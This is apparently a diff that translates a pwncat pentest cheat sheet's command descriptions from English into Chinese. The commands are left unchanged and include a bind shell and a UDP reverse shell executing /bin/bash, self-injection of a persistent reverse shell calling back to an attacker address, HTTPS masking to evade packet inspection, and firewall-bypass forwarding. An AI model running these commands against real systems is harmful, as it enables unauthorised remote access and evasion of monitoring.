@@ -3,108 +3,96 @@ tags: [network, connectivity, scanning, pentest, reverse-shell, pivoting, firewa
 
 actions:
 # === BASIC MODES (LISTEN & CONNECT) ===
- - title: pwncat - basic tcp listener
+ - title: pwncat - 基础 TCP 监听器
    desc: |
-     Starts a standard TCP listener on a specified port. This is the primary way 
-     to wait for incoming connections from a remote host. By default, the 
-     server will terminate once the client disconnects or the session ends.
+     在指定端口上启动标准 TCP 监听器。
+     这是等待远程主机传入连接的主要方式。
+     默认情况下，服务器会在客户端断开连接或会话结束后终止。
    command: "pwncat -l {{port|4444}}"
 
- - title: pwncat - basic tcp client connection
+ - title: pwncat - 基础 TCP 客户端连接
    desc: |
-     Initiates a TCP connection to a remote host and port. This is used to connect 
-     to a listening service or a bind shell on a target machine. It acts as a 
-     standard network client similar to netcat.
+     发起与远程主机和端口的 TCP 连接。
+     用于连接目标机器上的监听服务或 bind shell。
+     它的行为类似于 netcat 的标准网络客户端。
    command: "pwncat {{hostname}} {{port|4444}}"
 
- - title: pwncat - bind shell listener
+ - title: pwncat - bind shell 监听器
    desc: |
-     Starts a listener and executes a shell command when a client connects. 
-     This effectively creates a bind shell on the machine where this command is run. 
-     Use this with caution as it provides remote access to the system's command line.
+     启动监听器，并在客户端连接时执行 shell 命令。
+     这实际上会在运行此命令的机器上创建一个 bind shell。
+     使用时请谨慎，因为它提供了对系统命令行的远程访问。
    command: "pwncat -l {{port|4444}} -e {{shell|/bin/bash}}"
 
 # === PERSISTENCE & RELIABILITY ===
- - title: pwncat - persistent listener (keep-open)
+ - title: pwncat - 持久监听器（keep-open）
    desc: |
-     Starts a TCP listener that stays open and accepts new connections even 
-     after a client disconnects. The -k or --keep-open flag prevents the 
-     process from exiting when the first session is closed. This is essential 
-     for maintaining a steady entry point during a penetration test.
+     启动一个 TCP 监听器，即使客户端断开连接后也保持打开并接受新连接。
+     -k 或 --keep-open 标志可防止进程在第一个会话关闭后退出。
+     这对于在渗透测试期间维持稳定的入口点至关重要。
    command: "pwncat -l -k {{port|4444}}"
 
- - title: pwncat - automatic client reconnection
+ - title: pwncat - 客户端自动重连
    desc: |
-     Attempts to connect to a remote host and automatically retries if the 
-     connection is refused or dropped. The --reconn flag can be followed by 
-     a number for specific retries or left empty for infinite attempts. 
-     This ensures a reverse shell remains active through network instability.
+     尝试连接到远程主机，并在连接被拒绝或断开时自动重试。
+     --reconn 标志后面可以跟一个数字指定重试次数，或留空表示无限尝试。
+     这确保反向 shell 在网络不稳定期间保持活动。
    command: "pwncat {{hostname}} {{port|4444}} --reconn --reconn-wait {{seconds|5}}"
 
- - title: pwncat - listener with rebind on failure
+ - title: pwncat - 失败时重新绑定的监听器
    desc: |
-     Instructs the server to attempt to re-bind to the port if the initial 
-     attempt fails. This is useful in scenarios where a port might be 
-     temporarily locked by the OS or another process. You can specify 
-     how many times to retry before the tool gives up.
+     指示服务器在初次绑定尝试失败时尝试重新绑定端口。
+     这在端口可能被操作系统或其他进程临时锁定的场景中很有用。
+     你可以指定工具放弃前重试的次数。
    command: "pwncat -l {{port|4444}} --rebind {{retry_count|10}} --rebind-wait {{seconds|2}}"
 
 # === PORT SCANNING (ZERO-I/O) ===
- - title: pwncat - port scanning with banner grabbing
+ - title: pwncat - 带横幅抓取的端口扫描
    desc: |
-     Scans a range of ports on a target host using Zero-I/O mode. The --banner 
-     flag attempts to capture the service banner for version detection. 
-     You can specify port ranges using hyphens or lists using commas 
-     to quickly identify open services.
+     使用 Zero-I/O 模式扫描目标主机上的端口范围。
+     --banner 标志尝试捕获服务横幅以进行版本检测。
+     你可以使用连字符指定端口范围，或使用逗号指定列表，以快速识别开放服务。
    command: "pwncat -z {{hostname}} {{port_range|1-1024}} --banner"
 
 # === PORT FORWARDING & PIVOTING ===
- - title: pwncat - local port forwarding
+ - title: pwncat - 本地端口转发
    desc: |
-     Maps a local port to a remote service through an internal pwncat proxy. 
-     This allows you to access services on a remote network that are 
-     otherwise blocked by firewalls. Traffic sent to the local port 
-     is tunneled directly to the specified destination.
+     通过内部 pwncat 代理将本地端口映射到远程服务。
+     这使你可以访问远程网络上原本被防火墙阻止的服务。
+     发送到本地端口的流量会直接隧道到指定目标。
    command: "pwncat -L {{local_addr|127.0.0.1}}:{{local_port|8080}} {{remote_host}} {{remote_port|80}}"
 
- - title: pwncat - remote port forwarding
+ - title: pwncat - 远程端口转发
    desc: |
-     Establishes two internal clients to proxy traffic between a target and 
-     a remote pwncat server. This mode is ideal for bypassing strict 
-     inbound firewall rules by initiating an outbound connection. It 
-     effectively pushes access to an internal service out to your listener.
+     建立两个内部客户端，在目标与远程 pwncat 服务器之间代理流量。
+     此模式非常适合通过发起出站连接来绕过严格的入站防火墙规则。
+     它实际上将内部服务的访问推到你的监听器上。
    command: "pwncat -R {{remote_listener_ip}}:{{remote_listener_port}} {{target_host}} {{target_port}}"
 
 # === EVASION & ADVANCED PROTOCOLS ===
- - title: pwncat - traffic masking with http/https
+ - title: pwncat - 使用 HTTP/HTTPS 伪装流量
    desc: |
-     Wraps the communication in HTTP or HTTPS packets to evade Deep Packet 
-     Inspection (DPI) and firewall filters. This makes the connection 
-     appear as legitimate web traffic to security monitoring tools. 
-     Custom headers can be added to further mimic real browser requests.
+     将通信包装在 HTTP 或 HTTPS 数据包中，以逃避深度包检测（DPI）和防火墙过滤。
+     这使连接在安全监控工具看来像合法的 Web 流量。
+     可以添加自定义头以进一步模拟真实的浏览器请求。
    command: "pwncat --{{protocol|https}} --header \"User-Agent: Mozilla/5.0\" {{hostname}} {{port|443}}"
 
- - title: pwncat - udp reverse shell with ping init
+ - title: pwncat - 带 ping 初始化的 UDP 反向 shell
    desc: |
-     Creates a reverse shell over the UDP protocol, which is stateless. 
-     The --ping-init flag is required so the listener can discover the 
-     client's IP address and start communicating. This is useful for 
-     environments where TCP traffic is heavily monitored or restricted.
+     通过无状态的 UDP 协议创建反向 shell。
+     需要 --ping-init 标志，以便监听器可以发现客户端的 IP 地址并开始通信。
+     这在 TCP 流量被严密监控或限制的环境中很有用。
    command: "pwncat {{hostname}} {{port|4444}} -u --ping-init --ping-intvl {{seconds|10}} -e {{shell|/bin/bash}}"
 
- - title: pwncat - outbound port probing (port robin)
+ - title: pwncat - 出站端口探测（port robin）
    desc: |
-     Attempts to connect to a list of ports in a round-robin fashion to 
-     identify which outbound ports are permitted by a firewall. This 
-     is combined with the --reconn-robin flag to cycle through 
-     different destination ports until a connection is successful.
+     以轮询方式尝试连接一组端口，以识别防火墙允许哪些出站端口。
+     它与 --reconn-robin 标志结合使用，循环尝试不同的目标端口直到连接成功。
    command: "pwncat {{hostname}} {{port|4444}} --reconn --reconn-robin {{port_list|80,443,53,8080}}"
 
- - title: pwncat - automatic self-injection (experimental)
+ - title: pwncat - 自动自注入（实验性）
    desc: |
-     Automatically deploys a persistent pwncat reverse shell once a 
-     connection is received. This replaces a simple shell (like bash) 
-     with a fully featured pwncat instance that connects back to 
-     your specified address. This is currently an experimental feature 
-     limited to Linux remote hosts.
+     在收到连接后自动部署持久的 pwncat 反向 shell。
+     这会将简单的 shell（如 bash）替换为功能完整的 pwncat 实例，并回连到你指定的地址。
+     目前这是一项实验性功能，仅限于 Linux 远程主机。
    command: "pwncat -l {{port|4444}} --self-inject {{shell|/bin/bash}}:{{callback_ip}}:{{callback_port|4445}}"
